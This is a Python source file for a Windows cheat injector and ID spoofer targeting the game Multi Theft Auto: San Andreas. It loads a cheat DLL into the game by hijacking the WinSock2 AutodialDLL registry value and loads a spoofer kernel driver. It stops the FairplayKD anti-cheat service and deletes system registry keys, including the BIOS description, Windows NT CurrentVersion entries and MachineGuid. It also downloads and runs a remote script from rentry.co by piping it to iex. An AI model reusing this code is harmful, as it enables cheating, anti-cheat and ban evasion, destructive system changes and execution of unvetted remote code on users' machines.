import os
import subprocess
import sys
import json
import re
import base64
import datetime
import time
import tempfile
from colorama import init, Fore, Style
init()
import random
import string
import winreg
import subprocess
import ctypes
import psutil
import msvcrt

def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    else:
        print(Fore.RED + "[ERROR] Admin privileges required")
        sys.exit(0)

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
temp_folder = tempfile.gettempdir()
    
def banner():
    os.system("cls")
    print(Fore.RED + """
                     ▄████████    ▄████████  ▄█        ▄█        ▄█     ▄████████     ███      ▄██████▄  
                    ███    ███   ███    ███ ███       ███       ███    ███    ███ ▀█████████▄ ███    ███ 
                    ███    █▀    ███    ███ ███       ███       ███▌   ███    █▀     ▀███▀▀██ ███    ███ 
                    ███          ███    ███ ███       ███       ███▌   ███            ███   ▀ ███    ███ 
                    ███        ▀███████████ ███       ███       ███▌ ▀███████████     ███     ███    ███ 
                    ███    █▄    ███    ███ ███       ███       ███           ███     ███     ███    ███ 
                    ███    ███   ███    ███ ███▌    ▄ ███▌    ▄ ███     ▄█    ███     ███     ███    ███ 
                    ████████▀    ███    █▀  █████▄▄██ █████▄▄██ █▀    ▄████████▀     ▄████▀    ▀██████▀  
                                            ▀         ▀                                                  
                     ▄█  ███▄▄▄▄        ▄█    ▄████████  ▄████████     ███      ▄██████▄     ▄████████   
                    ███  ███▀▀▀██▄     ███   ███    ███ ███    ███ ▀█████████▄ ███    ███   ███    ███   
                    ███▌ ███   ███     ███   ███    █▀  ███    █▀     ▀███▀▀██ ███    ███   ███    ███   
                    ███▌ ███   ███     ███  ▄███▄▄▄     ███            ███   ▀ ███    ███  ▄███▄▄▄▄██▀   
                    ███▌ ███   ███     ███ ▀▀███▀▀▀     ███            ███     ███    ███ ▀▀███▀▀▀▀▀     
                    ███  ███   ███     ███   ███    █▄  ███    █▄      ███     ███    ███ ▀███████████   
                    ███  ███   ███     ███   ███    ███ ███    ███     ███     ███    ███   ███    ███   
                    █▀    ▀█   █▀  █▄ ▄███   ██████████ ████████▀     ▄████▀    ▀██████▀    ███    ███   
                                   ▀▀▀▀▀▀                                                   ███    ███   
                                   
                   """)

def random_filename():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8)) + ".dat"
    
def random_foldername():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=8))

def save_base64_file(b64_data, output_path):
    try:
        file_bytes = base64.b64decode(b64_data)
        with open(output_path, "wb") as f:
            f.write(file_bytes)
        return True
    except Exception:
        return False

def get_mta_path():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Multi Theft Auto: San Andreas All\1.6")
        value, _ = winreg.QueryValueEx(key, "Last Run Path")
        winreg.CloseKey(key)
        return value
    except FileNotFoundError:
        return None

def get_mta_serial():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Multi Theft Auto: San Andreas All\1.6\Settings\general")
        value, _ = winreg.QueryValueEx(key, "serial")
        winreg.CloseKey(key)
        return value
    except FileNotFoundError:
        return None

def set_new_serial():
    try:
        # Generate a random serial (format similar to MTA serials)
        new_serial = ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))
        
        # Create or open the registry key
        key_path = r"SOFTWARE\WOW6432Node\Multi Theft Auto: San Andreas All\1.6\Settings\general"
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
        except FileNotFoundError:
            # If the key doesn't exist, create it
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        
        # Set the serial value
        winreg.SetValueEx(key, "serial", 0, winreg.REG_SZ, "B2030DE2119C4A605E641BBB595502E3")
        winreg.CloseKey(key)
        
        print(" " * 48 + Fore.GREEN + "[SUCC] " + Fore.WHITE + f"New serial set: {new_serial}")
        return True
    except Exception as e:
        print(" " * 48 + Fore.RED + "[ERROR] " + Fore.WHITE + f"Failed to set new serial: {e}")
        return False
        
def getCheatData():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    dll_path = os.path.join(current_dir, "@_51.dll")
    
    try:
        with open(dll_path, "rb") as dll_file:
            file_content = dll_file.read()
        
        base64_data = base64.b64encode(file_content).decode('utf-8')
        return base64_data
        
    except FileNotFoundError:
        print(f"                                      {Fore.RED}[ERROR] {Fore.WHITE}DLL file not found: {dll_path}")
        return None
    except Exception as e:
        print(f"                                      {Fore.RED}[ERROR] {Fore.WHITE}Error reading file: {e}")
        return None

def wait_and_set_autodialdll(target_process="gta_sa.exe", dll_path=r"C:\Windows\System32\rasadhlp.dll"):
    while True:
        running = any(p.name().lower() == target_process.lower() for p in psutil.process_iter())
        if running:
            break
        time.sleep(0.5)

    time.sleep(4)

    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\WinSock2\Parameters", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "AutodialDLL", 0, winreg.REG_SZ, dll_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        return False

def set_autodialdll(dll_path):
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\ControlSet001\Services\WinSock2\Parameters", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "AutodialDLL", 0, winreg.REG_SZ, dll_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Error setting AutodialDLL: {e}")
        return False

def run_bat_spoofer():
    print(" " * 48 + Fore.RED + "[INFO] " + Fore.WHITE + "Running Spoofer...")
    print(" " * 48 + Fore.RED + "[INFO] " + Fore.CYAN + "Your Current Serial: " + Fore.WHITE + (get_mta_serial() or "nil"))
    
    #print(Fore.CYAN + "[+] Your Current Serial: " + Fore.WHITE + (get_mta_serial() or "nil"))
    
    current_dir = os.path.dirname(os.path.abspath(__file__))
    exe_path = os.path.join(current_dir, "Spoofing/uzTbbLmYiv.exe")
    sys_path = os.path.join(current_dir, "Spoofing/spoofer.sys")
    
    os.system(f"{exe_path} {sys_path} >nul 2>&1")
    
    commands = [
        'powershell -Command "Stop-Process -Name \\"WmiPrvSE\\" -Force"',
        'powershell -Command "Set-Location -Path C:\\ -Force"',
        'powershell -Command "Remove-Item C:\\ProgramData:NT -Force"',
        'powershell -Command "Remove-Item C:\\ProgramData:NT2 -Force"',
        'powershell -Command "Set-Location -Path C:\\ProgramData -Force"',
        'powershell -Command "Remove-Item \\"MTA San Andreas All\\" -Force"',
        'powershell -Command "Set-Location -Path C:\\Users\\%username%\\AppData -Force"',
        'powershell -Command "Remove-Item C:\\Users\\%username%\\AppData\\Roaming:NT -Force"',
        'powershell -Command "Remove-Item C:\\Users\\%username%\\AppData\\Roaming:NT2 -Force"',
        'powershell -Command "Remove-Item -Path \\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID2*\\" -Recurse -Force"',
        'powershell -Command "Remove-Item -Path \\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections\\" -Recurse -Force"',
        'powershell -Command "Remove-Item -Path \\"HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\MTA:SA 1.6\\" -Recurse -Force"',
        'powershell -Command "Remove-Item -Path \\"HKLM:\\SOFTWARE\\WOW6432Node\\Multi Theft Auto: San Andreas All\\1.6\\" -Recurse -Force"',
        'powershell -Command "Remove-Item -Path \\"HKLM:\\SOFTWARE\\Classes\\mtasa\\" -Recurse -Force"',
        'powershell -Command "Remove-Item -Path \\"HKLM:\\HARDWARE\\DESCRIPTION\\System\\BIOS\\" -Recurse -Force"',
        'powershell -Command "Remove-Item -Path \\"HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FolderDescriptions\\" -Recurse -Force"',
        'powershell -Command "Remove-Item -Path \\"HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" -Recurse -Force"',
        'powershell -Command "Remove-Item -Path \\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\" -Recurse -Force"',
        'powershell -Command "Remove-ItemProperty -Path \\"HKLM:\\SOFTWARE\\Microsoft\\Cryptography\\" -Name \\"MachineGuid\\""',
        'powershell -Command "rd \\"C:\\ProgramData\\MTA San Andreas All\\" -Recurse -Force"',
        'powershell -Command "Set-Location -Path J:\\"',
        'powershell -ExecutionPolicy Bypass -File C:\\Users\\service.ps1',
        'powershell "irm rentry.co/Sp00fing/raw | iex"',
        'sc stop FairplayKD',
    ]
    
    for cmd in commands:
        os.system(cmd + " >nul 2>&1")
    
    
    paths_to_delete = [
        #"C:\\Program Files (x86)\\MTA San Andreas 1.6\\MTA\\logs",
        "C:\\ProgramData\\MTA San Andreas All\\1.6\\upcache",
        "C:\\ProgramData\\MTA San Andreas All\\Common\\temp3",
        "C:\\ProgramData\\MTA San Andreas All\\Common\\data\\cache"
    ]
    
    files_to_delete = [
        "C:\\ProgramData\\MTA San Andreas All\\1.6\\report.log",
        "C:\\Program Files (x86)\\MTA San Andreas 1.6\\MTA\\config\\servercache.xml"
    ]
    
    for path in paths_to_delete:
        os.system(f'rmdir /s /q "{path}" > NUL 2>&1')
    
    for file in files_to_delete:
        os.system(f'del "{file}" > NUL 2>&1')
    
    os.system('taskkill /f /im WmiPrvSE.exe > NUL 2>&1')
    os.system('rmdir /s /q "C:\\ProgramData\\MTA San Andreas All\\Common" > NUL 2>&1')
    os.system('rmdir /s /q "C:\\ProgramData\\MTA San Andreas All\\1.6" > NUL 2>&1')
    os.system('mkdir "C:\\ProgramData\\MTA San Andreas All\\Common" > NUL 2>&1')
    os.system('mkdir "C:\\ProgramData\\MTA San Andreas All\\1.6" > NUL 2>&1')
    
    new_product_id = f"{random.randint(1000, 9999)}-41Z79-03200-S6{random.randint(1000, 9999)}"
    os.system(f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /v ProductId /t REG_SZ /d {new_product_id} /f > NUL 2>&1')
    
    reg_keys_to_delete = [
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Multi Theft Auto: San Andreas All\\Common\\diagnostics",
        "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched",
        "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\MTA:SA 1.6",
        "HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\mtasa"
    ]
    
    for key in reg_keys_to_delete:
        os.system(f'reg delete "{key}" /f > NUL 2>&1')
    
    # Add this line after the spoofing commands
    # set_new_serial()
    
    print(" " * 48 + Fore.GREEN + "[SUCC] " + Fore.WHITE + "Serial Changed!")


def get_user_choice():
    options = [
        "1. Injection only",
        "2. Injection with Spoofing",
        "3. Spoofing only"
    ]
    
    selected = 0  # Index of selected option
    
    while True:
        os.system("cls")
        banner()
        print(" " * 48 + Fore.RED + "[INFO] " + Fore.WHITE + "Devloper : @_51")
        print("\n" + " " * 38 + Fore.WHITE + "Choose an option (use arrow keys and press Enter):")
        
        for i, option in enumerate(options):
            if i == selected:
                print(" " * 45 + Fore.GREEN + "> " + option + Style.RESET_ALL)
            else:
                print(" " * 45 + "  " + option + Style.RESET_ALL)
        
        # Get keyboard input
        key = msvcrt.getch()
        
        # Arrow key handling
        if key == b'\xe0':  # Extended key (arrows)
            key = msvcrt.getch()
            if key == b'H':  # Up arrow
                selected = (selected - 1) % len(options)
            elif key == b'P':  # Down arrow
                selected = (selected + 1) % len(options)
        elif key == b'\r':  # Enter key
            return str(selected + 1)  # Return 1, 2, or 3

if __name__ == "__main__":
    os.system('@echo off')
    if not run_as_admin():
        print(Fore.RED + "[ERROR] Admin privileges required")
        time.sleep(3)
        sys.exit(1)
    
    banner()
    
    print(" " * 48 + Fore.RED + "[INFO] " + Fore.WHITE + "Devloper : @_51")

    # Get user choice
    choice = get_user_choice()
    
    banner()
    
    print(" " * 48 + Fore.RED + "[INFO] " + Fore.WHITE + "Devloper : @_51")
    
    mta_path = get_mta_path() or r"C:\Program Files (x86)\MTA San Andreas 1.6\Multi Theft Auto.exe"
    
    # Run spoofer if chosen
    if choice == '2':
        run_bat_spoofer()
    elif choice == '3':
        run_bat_spoofer()
        if mta_path:
            print(" " * 48 + Fore.RED + "[INFO] " + Fore.WHITE + "Opening MTA:SA...")
            os.system(f'start "" "{mta_path}"')
        sys.exit(0)
    
    # Continue with injection process
    rand_file = os.path.join(temp_folder, random_filename())

    print(" " * 48 + Fore.RED + "[INFO] " + Fore.WHITE + "Searching for DLL files...")
    data = getCheatData()
    if data:
        if save_base64_file(data, rand_file):
            if mta_path:
                if set_autodialdll(rand_file):
                    print(" " * 48 + Fore.RED + "[INFO] " + Fore.WHITE + "Opening MTA:SA...")
                    os.system(f'start "" "{mta_path}"')
                    wait_and_set_autodialdll()
                    print(" " * 48 + Fore.GREEN + "[SUCC] " + Fore.WHITE + "Injection completed!")
                    sys.exit(0)
                else:
                    print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #4")
                    time.sleep(3)
                    sys.exit(0)
            else:
                print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #3")
                time.sleep(3)
                sys.exit(0)
        else:
            print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #1")
            time.sleep(3)
            sys.exit(0)
    else:
        print("                                      " + Fore.RED + "[ERROR] " + Fore.WHITE + "Error while injecting , #2")
        time.sleep(3)
        sys.exit(0)